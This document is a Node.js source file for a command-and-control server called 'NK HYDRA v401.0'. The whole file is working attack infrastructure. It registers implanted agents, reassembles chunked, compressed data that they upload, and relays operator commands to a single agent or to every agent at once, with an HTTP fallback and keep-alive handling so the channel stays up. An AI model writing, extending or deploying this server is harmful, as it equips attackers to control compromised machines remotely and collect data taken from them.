// TYPE: NODE.JS C2 SERVER
// NK HYDRA v401.0 [ROBUST + KEEP ALIVE]

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const zlib = require('zlib');

const app = express();
app.use(cors({ origin: '*' })); 
app.use(express.json({ limit: '50mb' }));

app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v401.0' }); });

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 1e8,
    pingTimeout: 60000,
    pingInterval: 25000
});

let agents = []; 
let eventHistory = []; 
let chunkBuffer = {};

function logEvent(event) {
    eventHistory.push({ ...event, timestamp: Date.now() });
    if (eventHistory.length > 1000) eventHistory.shift();
}

function updateAgentStatus(agentId, meta = {}) {
    const idx = agents.findIndex(a => a.id === agentId);
    if (idx >= 0) {
        agents[idx] = { ...agents[idx], ...meta, lastSeen: Date.now(), status: 'Online' };
    } else {
        agents.push({ id: agentId, socketId: 'http_fallback', status: 'Online', lastSeen: Date.now(), ...meta });
    }
    io.to('ui_room').emit('agents_list', agents);
}

// HTTP FALLBACK ENDPOINT
app.post('/fallback_event', (req, res) => {
    const packet = req.body;
    
    if (packet.id && packet.data) processChunk(packet);
    else if (packet.agentId) {
        if (packet.type !== 'HEARTBEAT') {
             io.to('ui_room').emit('agent_event', packet);
             logEvent(packet);
        }
        updateAgentStatus(packet.agentId);
    }
    res.sendStatus(200);
});

function processChunk(packet) {
    const { id, idx, total, data, type, agentId } = packet;
    updateAgentStatus(agentId);

    if (!chunkBuffer[id]) chunkBuffer[id] = { total, chunks: [], count: 0, type, agentId };
    
    if (!chunkBuffer[id].chunks[idx]) {
        chunkBuffer[id].chunks[idx] = data;
        chunkBuffer[id].count++;
    }

    if (chunkBuffer[id].count === total) {
        try {
            const fullBase64 = chunkBuffer[id].chunks.join('');
            const compressedBuffer = Buffer.from(fullBase64, 'base64');
            zlib.unzip(compressedBuffer, (err, buffer) => {
                if (!err) {
                    const jsonStr = buffer.toString();
                    const payload = JSON.parse(jsonStr);
                    const fullEvent = { type: chunkBuffer[id].type, agentId: chunkBuffer[id].agentId, payload };
                    io.to('ui_room').emit('agent_event', fullEvent);
                    logEvent(fullEvent);
                }
                delete chunkBuffer[id];
            });
        } catch (e) { delete chunkBuffer[id]; }
    }
}

io.on('connection', (socket) => {
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
            socket.emit('history_dump', eventHistory);
            return;
        }
        
        const existingIdx = agents.findIndex(a => a.id === data.id);
        const agentData = { ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() };
        if (existingIdx >= 0) agents[existingIdx] = agentData;
        else agents.push(agentData);
        
        io.to('ui_room').emit('agents_list', agents);
        logEvent({ type: 'SYSTEM', payload: { message: `Agent ${data.id} connected`, level: 'INFO', source: 'C2' }});
    });

    socket.on('agent_chunk', (packet) => processChunk(packet));

    socket.on('exec_cmd', (data) => {
        if (data.targetId === 'all') socket.broadcast.emit('exec_cmd', data); 
        else {
            const agent = agents.find(a => a.id === data.targetId);
            if (agent && agent.socketId !== 'http_fallback') {
                io.to(agent.socketId).emit('exec_cmd', data);
            }
        }
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { 
            setTimeout(() => {
                const check = agents.find(a => a.id === agent.id);
                if (check && (Date.now() - check.lastSeen > 15000)) {
                    check.status = 'Offline'; 
                    io.to('ui_room').emit('agents_list', agents);
                }
            }, 15000); 
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`HYDRA v401.0 RUNNING ON ${PORT}`));
